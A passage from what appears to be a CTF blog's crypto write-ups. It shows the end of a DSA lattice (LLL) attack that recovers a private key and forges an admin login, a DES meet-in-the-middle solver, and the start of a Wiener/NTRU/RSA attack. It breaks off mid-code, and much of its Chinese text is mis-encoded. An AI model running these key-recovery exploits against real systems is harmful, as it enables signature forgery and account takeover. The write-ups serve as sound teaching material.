    r, s, kbits = sign(m)</span><br><span class="line">        <span class="keyword">if</span> kbits &gt; <span class="number">121</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        A = (inverse(s, q) * Hm) % q</span><br><span class="line">        B = (inverse(s, q) * r) % q</span><br><span class="line">        As.append(A)</span><br><span class="line">        Bs.append(B)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"[&#123;:0&gt;2d&#125;] k(&#123;&#125; bits) found!"</span>.format(i, kbits))</span><br><span class="line">    Bs = Bs + [<span class="number">1</span>/(<span class="number">2</span>**<span class="number">64</span>), <span class="number">0</span>]</span><br><span class="line">    As = As + [<span class="number">0</span>, <span class="number">2</span>**<span class="number">64</span>]</span><br><span class="line">    M_list.append(Bs)</span><br><span class="line">    M_list.append(As)</span><br><span class="line">    M = Matrix(QQ, M_list)</span><br><span class="line">    ML = M.LLL()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> ML:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">-1</span>] == (<span class="number">2</span>**<span class="number">64</span>):</span><br><span class="line">            prikey = (line[<span class="number">-2</span>] * (<span class="number">2</span>**<span class="number">64</span>)) % q</span><br><span class="line">            print(<span class="string">"[+] SVP's solution found! prikey = &#123;&#125;"</span>.format(prikey))</span><br><span class="line">            <span class="keyword">return</span> prikey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    pubkey = get_dsa_params()</span><br><span class="line">    prikey = crack_x(pubkey)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    login_as_admin(pubkey, prikey)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line">    </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">dktb@ubuntu:/mnt/hgfs/share/HNP$ sage -Â¾","m!\x7f" -- 44.596%</span></span><br><span class="line"><span class="string">                           zÂ¼","Ã°&#125;","*&gt;","'Â¿" -- 54.467%</span></span><br><span class="line"><span class="string">[+] MBruteforcing: Found key: "Ãƒ"</span></span><br><span class="line"><span class="string">[01] k(121 bits) found!</span></span><br><span class="line"><span class="string">[02] k(121 bits) found!</span></span><br><span class="line"><span class="string">[03] k(120 bits) found!</span></span><br><span class="line"><span class="string">[04] k(121 bits) found!</span></span><br><span class="line"><span class="string">[05] k(117 bits) found!</span></span><br><span class="line"><span class="string">[06] k(121 bits) found!</span></span><br><span class="line"><span class="string">[07] k(121 bits) found!</span></span><br><span class="line"><span class="string">[08] k(120 bits) found!</span></span><br><span class="line"><span class="string">[09] k(121 bits) found!</span></span><br><span class="line"><span class="string">[10] k(121 bits) found!</span></span><br><span class="line"><span class="string">[11] k(115 bits) found!</span></span><br><span class="line"><span class="string">[12] k(121 bits) found!</span></span><br><span class="line"><span class="string">[13] k(119 bits) found!</span></span><br><span class="line"><span class="string">[14] k(120 bits) found!</span></span><br><span class="line"><span class="string">[15] k(121 bits) found!</span></span><br><span class="line"><span class="string">[16] k(121 bits) found!</span></span><br><span class="line"><span class="string">[17] k(118 bits) found!</span></span><br><span class="line"><span class="string">[18] k(120 bits) found!</span></span><br><span class="line"><span class="string">[19] k(121 bits) found!</span></span><br><span class="line"><span class="string">[20] k(121 bits) found!</span></span><br><span class="line"><span class="string">[21] k(120 bits) found!</span></span><br><span class="line"><span class="string">[22] k(121 bits) found!</span></span><br><span class="line"><span class="string">[23] k(121 bits) found!</span></span><br><span class="line"><span class="string">[24] k(121 bits) found!</span></span><br><span class="line"><span class="string">[25] k(121 bits) found!</span></span><br><span class="line"><span class="string">[26] k(118 bits) found!</span></span><br><span class="line"><span class="string">[27] k(121 bits) found!</span></span><br><span class="line"><span class="string">[28] k(116 bits) found!</span></span><br><span class="line"><span class="string">[29] k(121 bits) found!</span></span><br><span class="line"><span class="string">[30] k(121 bits) found!</span></span><br><span class="line"><span class="string">[31] k(120 bits) found!</span></span><br><span class="line"><span class="string">[32] k(118 bits) found!</span></span><br><span class="line"><span class="string">[33] k(121 bits) found!</span></span><br><span class="line"><span class="string">[34] k(121 bits) found!</span></span><br><span class="line"><span class="string">[35] k(121 bits) found!</span></span><br><span class="line"><span class="string">[+] SVP's solution found! prikey = 72250087844423678254657706833192856476</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    b'2\n'</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x1f bytes:</span></span><br><span class="line"><span class="string">    b'Please send me your signature: '</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x5b bytes:</span></span><br><span class="line"><span class="string">    b'61646d696e000000005f97da6d7e9faf6a182ff43f3cb4bd1000000000b5a29a7038325fee75abbf8372eccece\n'</span></span><br><span class="line"><span class="string">[*] Switching to interactive mode</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x67 bytes:</span></span><br><span class="line"><span class="string">    b'Welcome, admin\n'</span></span><br><span class="line"><span class="string">    b'The flag is flag&#123;25903ADB-15B6-44D7-A027-CAE500675EA5&#125;\n'</span></span><br><span class="line"><span class="string">    b'\n'</span></span><br><span class="line"><span class="string">    b'1. sign up\n'</span></span><br><span class="line"><span class="string">    b'2. sign in\n'</span></span><br><span class="line"><span class="string">    b'3. exit\n'</span></span><br><span class="line"><span class="string">    b'$ '</span></span><br><span class="line"><span class="string">Welcome, admin</span></span><br><span class="line"><span class="string">The flag is flag&#123;25903ADB-15B6-44D7-A027-CAE500675EA5&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="b01lers2020-Des-MMXX"><a href="#b01lers2020-Des-MMXX" class="headerlink" title="[b01lers2020 - Des-MMXX]"></a>[b01lers2020 - Des-MMXX]</h3><h4 id="é¢˜ç›®è€ƒç‚¹-2"><a href="#é¢˜ç›®è€ƒç‚¹-2" class="headerlink" title="[é¢˜ç›®è€ƒç‚¹]"></a>[é¢˜ç›®è€ƒç‚¹]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">seed = <span class="string">b'secret_sauce_#9'</span>   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span><span class="params">(s)</span>:</span></span><br><span class="line">   keys = []</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2020</span>):</span><br><span class="line">      s = sha256(s).digest()</span><br><span class="line">      keys.append(s)</span><br><span class="line">   <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line">keys = keygen(seed)</span><br></pre></td></tr></table></figure><p>2020ä¸ªkeyså‡å·²çŸ¥ï¼Œå…³æ³¨ä»¥ä¸‹åŠ å¯†é€»è¾‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">SECRET = <span class="number">0xa</span><span class="comment">########e          # remember to erase this later..</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scramble</span><span class="params">(s)</span>:</span></span><br><span class="line">   ret = <span class="string">""</span>.join( [format(s &amp; <span class="number">0xfffff</span>, <span class="string">'020b'</span>)]*<span class="number">101</span> )</span><br><span class="line">   ret += <span class="string">""</span>.join( [format(s &gt;&gt; <span class="number">20</span>, <span class="string">'020b'</span>)]*<span class="number">101</span> )</span><br><span class="line">   <span class="keyword">return</span> int(ret, <span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(keys, msg)</span>:</span></span><br><span class="line">   dk = scramble(SECRET)</span><br><span class="line">   <span class="keyword">for</span> v <span class="keyword">in</span> keys:</span><br><span class="line">      idx = dk &amp; <span class="number">3</span></span><br><span class="line">      dk &gt;&gt;= <span class="number">2</span></span><br><span class="line">      k = v[idx*<span class="number">8</span>:(idx+<span class="number">1</span>)*<span class="number">8</span>]</span><br><span class="line">      cp = DES.new(k, DES.MODE_CBC, bytes(<span class="number">8</span>))  </span><br><span class="line">      msg = cp.encrypt(msg)</span><br><span class="line">   <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag.txt"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">   msg = f.read()</span><br><span class="line"></span><br><span class="line">ctxt = encrypt(keys, msg)</span><br></pre></td></tr></table></figure><p><code>scramble</code>ä½¿SECRETå‰²è£‚æˆäº†ä¸¤ä¸ª20bitsï¼Œå¹¶å„è‡ªé‡å¤101æ¬¡ï¼Œåœ¨encryptå¼€å¤´å½¢æˆ4040bitsçš„dk</p><p>å¾ˆæ˜æ˜¾çš„ä¸­é—´ç›¸é‡æ”»å‡»çš„é€»è¾‘ï¼Œä½†buuç¼ºäº†ä¸€å¯¹æ˜å¯†æ–‡æ¡ä»¶â€¦äººå‚»äº†</p><p>äºæ˜¯ä¸Šctftimeä¸Šæ‰¾äº†å®˜æ–¹ä»“åº“é‡ŒåŸæœ‰çš„é‚£å¯¹æ˜å¯†æ–‡ï¼Œæ‹¿åˆ°ä»¥åç›´æ¥MEET IN THE MIDDLEå³å¯</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">seed = <span class="string">b'secret_sauce_#9'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span><span class="params">(s)</span>:</span></span><br><span class="line">   keys = []</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2020</span>):</span><br><span class="line">      s = sha256(s).digest()</span><br><span class="line">      keys.append(s)</span><br><span class="line">   <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line">keys = keygen(seed)</span><br><span class="line"></span><br><span class="line">upper_key = keys[<span class="number">1010</span>:][::<span class="number">-1</span>]</span><br><span class="line">lower_key = keys[:<span class="number">1010</span>]</span><br><span class="line">upper_dk = <span class="number">0x0000e</span></span><br><span class="line">lower_dk = <span class="number">0xa0000</span></span><br><span class="line">pt = <span class="string">b"Attack at DAWN!!"</span></span><br><span class="line">ct = <span class="string">b"\x15\x08\x54\xff\x3c\xf4\xc4\xc0\xd2\x3b\xd6\x8a\x82\x34\x83\xbe"</span></span><br><span class="line"></span><br><span class="line">orig_ct = ct</span><br><span class="line">upper_side = []</span><br><span class="line"><span class="keyword">for</span> ud <span class="keyword">in</span> tqdm(range(<span class="number">0x10000</span>)):</span><br><span class="line">    guess_upper_dk = format((ud &lt;&lt; <span class="number">4</span>) + upper_dk, <span class="string">'020b'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1010</span>):</span><br><span class="line">        _ = (i * <span class="number">2</span>) % <span class="number">20</span></span><br><span class="line">        idx = int(guess_upper_dk[_:_+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">        k = upper_key[i][idx*<span class="number">8</span>:idx*<span class="number">8</span>+<span class="number">8</span>]</span><br><span class="line">        des = DES.new(k, DES.MODE_CBC, bytes(<span class="number">8</span>))</span><br><span class="line">        ct = des.decrypt(ct)</span><br><span class="line">    upper_side.append(ct)</span><br><span class="line">    ct = orig_ct</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 65536/65536 [19:31&lt;00:00, 55.93it/s]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">orig_pt = pt</span><br><span class="line">lower_side = []</span><br><span class="line"><span class="keyword">for</span> ld <span class="keyword">in</span> tqdm(range(<span class="number">0x10000</span>)):</span><br><span class="line">    guess_lower_dk = format(ld + lower_dk, <span class="string">'020b'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1010</span>):</span><br><span class="line">        _ = <span class="number">18</span> - ((i * <span class="number">2</span>) % <span class="number">20</span>)</span><br><span class="line">        idx = int(guess_lower_dk[_:_+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">        k = lower_key[i][idx*<span class="number">8</span>:idx*<span class="number">8</span>+<span class="number">8</span>]</span><br><span class="line">        des = DES.new(k, DES.MODE_CBC, bytes(<span class="number">8</span>))</span><br><span class="line">        pt = des.encrypt(pt)</span><br><span class="line">    lower_side.append(pt)</span><br><span class="line">    pt = orig_pt</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 65536/65536 [19:33&lt;00:00, 55.85it/s]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">crash = list(set(upper_side) &amp; set(lower_side))[<span class="number">0</span>]</span><br><span class="line">ud = upper_side.index(crash)</span><br><span class="line">ld = lower_side.index(crash)</span><br><span class="line">SECRET = int(format(ld + lower_dk, <span class="string">'020b'</span>) + format((ud &lt;&lt; <span class="number">4</span>) + upper_dk, <span class="string">'020b'</span>), <span class="number">2</span>)</span><br><span class="line">enc_flag = open(<span class="string">"flag.enc"</span>, <span class="string">"rb"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scramble</span><span class="params">(s)</span>:</span></span><br><span class="line">   ret = <span class="string">""</span>.join( [format(s &amp; <span class="number">0xfffff</span>, <span class="string">'020b'</span>)]*<span class="number">101</span> )</span><br><span class="line">   ret += <span class="string">""</span>.join( [format(s &gt;&gt; <span class="number">20</span>, <span class="string">'020b'</span>)]*<span class="number">101</span> )</span><br><span class="line">   <span class="keyword">return</span> int(ret, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">dk = scramble(SECRET)</span><br><span class="line">dk = format(dk, <span class="string">'04040b'</span>)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> keys[::<span class="number">-1</span>]:</span><br><span class="line">    idx = int(dk[i:i+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">    k = v[idx*<span class="number">8</span>:(idx+<span class="number">1</span>)*<span class="number">8</span>]</span><br><span class="line">    des = DES.new(k, DES.MODE_CBC, bytes(<span class="number">8</span>))</span><br><span class="line">    enc_flag = des.decrypt(enc_flag)</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line">enc_flag</span><br><span class="line"><span class="comment"># b'pctf&#123;Two_tO_thE_s1xt33n7h?_E4sy-p3asy..&#125;'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Training </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(WMCTF2020) - Crypto</title>
      <link href="/2020/08/02/WriteUp-WMCTF2020-Crypto/"/>
      <url>/2020/08/02/WriteUp-WMCTF2020-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h3><p><strong>idiot box ===&gt; </strong>hellmanæ‹¿äº†ä¸€è¡€ï¼Œç¥¥å“¥æ‹¿äº†äºŒè¡€ï¼Œé¡ºåˆ©è½å¹•ï¼ˆè‰è‰è‰è‰è‰è‰æ‰çŸ¥é“hellmanåšå£«éƒ½æ¯•ä¸šäº†dbq</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/QQå›¾ç‰‡20200803093512.jpg" alt></p><h3 id="Piece-of-Cake"><a href="#Piece-of-Cake" class="headerlink" title="Piece of Cake"></a>Piece of Cake</h3><h4 id="é¢˜è§£åˆ†æ"><a href="#é¢˜è§£åˆ†æ" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>è€ƒå¯ŸWienerâ€™s Attack &amp; NTRUæ­£å¸¸è§£å¯† &amp; RSA common private key attack</p><p>åœ¨æœ¬é¢˜ä¸­ï¼ŒRSA cryptosystemçš„ph=(p-1)(q+1), ed=1(mod ph), ä¸”dä½œä¸ºNTRUä¸­çš„f</p><p><strong>Encryption(NTRU part)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># case 2(make_cake)</span></span><br><span class="line">cake = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">1536</span>)</span><br><span class="line">size(f)\approx <span class="number">1024</span></span><br><span class="line">g = getPrime(<span class="number">1536</span> - size(f) - <span class="number">1</span>)</span><br><span class="line">size(f^&#123;<span class="number">-1</span>&#125;)\approx <span class="number">1536</span></span><br><span class="line">h = g * f^&#123;<span class="number">-1</span>&#125;</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line">c = (r * h + cake) % q <span class="comment"># size(c)\approx 1536</span></span><br></pre></td></tr></table></figure><h5 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h5><p><strong>Step 1</strong></p><p>$\because fh\equiv g(mod\ q)$</p><p>$\therefore fh=kq+g\Rightarrow\frac{h}{q}=\frac{k}{f}+\frac{g}{fq}\Rightarrow|\frac{h}{q}-\frac{k}{f}|=\frac{g}{fq}$</p><p>Now prove $\frac{1}{2f^2}&gt;\frac{g}{fq}$ which is equivalent to $q&gt;2fg$. </p><p><code>g = getPrime(q.bit_length() - f.bit_length() - 1)</code>, <strong>Satisfies!</strong></p><p><strong>Step 2</strong></p><p>For candidate $(f,g)$</p><p>On Zmod(q), $c=rh+cake=rgf^{-1}+cake$</p><p>$\therefore cf=rg+f\cdot cake$. (bit_length: r = 512; g â‰ˆ 511; f â‰ˆ 1024; q = 1536)</p><p> In case 1(eat_cake), size(cake) = 768, while in case 2(make_cake), size(cake) = 256</p><p>Hence we have $rg+f\cdot cake$ equivalent to Zmod(q) and ZZ which means that <strong>cake can be recover in case 2.</strong> </p><p>If we get correct cake, we also have d in RSA cryptosystem. </p><p>However, in this challenge, we have $ed-1=k(p-1)(q+1)$, not $ed-1=k(p-1)(q-1)$</p><p>$ed-kN=1+k(p-q-1)$</p><p>Cuz s = p-q-1 is also $&lt;3N^{1/2}$, LLL will be successful to obtain common e. (like <a href="https://0xdktb.top/2020/07/06/WriteUp-SCTF2020-Crypto/#rsa" target="_blank" rel="noopener">SCTF2020 RSA</a>)</p><p>size(e) = 477, $\delta=\frac{477}{1024}$</p><p>$\because\delta &lt;\frac{r}{2r+2}-log_{N_{r}}(6)$, $\therefore$ <strong>when $r\geq 15$, e must can be easily cracked.</strong></p><p><strong>Step 3</strong></p><p>After getting e, we use the same method to get d in case 1(eat_cake).</p><p>Then $ph=(p-1)(q+1),ed=1(mod\ ph)$, so $p\mid pow(2, ph, n),q\nmid pow(2,ph,n)$.</p><p>GCD to factor n, then get $phâ€™=edâ€™\equiv 1(mod\ (p-1)(q-1))$, finally <strong>getflag!</strong>  </p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><p>æœ¬åœ°æµ‹è¯•exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[102]:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">512</span></span><br><span class="line">e = getPrime(<span class="number">477</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat_cake</span><span class="params">()</span>:</span></span><br><span class="line">    p, q = getPrime(BITS), getPrime(BITS)</span><br><span class="line">    ph = (p - <span class="number">1</span>) * (q + <span class="number">1</span>)</span><br><span class="line">    N = p * q</span><br><span class="line">    d = inverse(e, ph)</span><br><span class="line">    </span><br><span class="line">    cake = getPrime(BITS &gt;&gt; <span class="number">1</span> | BITS)</span><br><span class="line">    q = getPrime(BITS &lt;&lt; <span class="number">1</span> | BITS)</span><br><span class="line">    f = d</span><br><span class="line">    g = getPrime(size(q) - size(f) - <span class="number">1</span>)</span><br><span class="line">    f_inv_q = inverse(f, q)</span><br><span class="line">    h = f_inv_q * g % q</span><br><span class="line">    r = getPrime(BITS)</span><br><span class="line">    c1 = (r * h + cake) % q</span><br><span class="line">    c2 = pow(cake, <span class="number">0x10001</span>, N)</span><br><span class="line">    print(cake)</span><br><span class="line">    <span class="keyword">return</span> q, h, c1, N, c2</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[103]:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_cake</span><span class="params">()</span>:</span></span><br><span class="line">    p, q = getPrime(BITS), getPrime(BITS)</span><br><span class="line">    N = p * q</span><br><span class="line">    ph = (p - <span class="number">1</span>) * (q + <span class="number">1</span>)</span><br><span class="line">    d = inverse(e, ph)</span><br><span class="line">    </span><br><span class="line">    cake = getPrime(BITS &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    q = getPrime(BITS &lt;&lt; <span class="number">1</span> | BITS)</span><br><span class="line">    f = d</span><br><span class="line">    g = getPrime(size(q) - size(f) - <span class="number">1</span>)</span><br><span class="line">    f_inv_q = inverse(f, q)</span><br><span class="line">    h = f_inv_q * g % q</span><br><span class="line">    r = getPrime(BITS)</span><br><span class="line">    c1 = (r * h + cake) % q</span><br><span class="line">    c2 = pow(cake, d, N)</span><br><span class="line">    <span class="keyword">return</span> q, h, c1, N, c2</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[104]:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational_to_quotients</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    a = x // y</span><br><span class="line">    quotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        quotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> quotients</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents_from_quotients</span><span class="params">(quotients)</span>:</span></span><br><span class="line">    convergents = [(quotients[<span class="number">0</span>], <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span 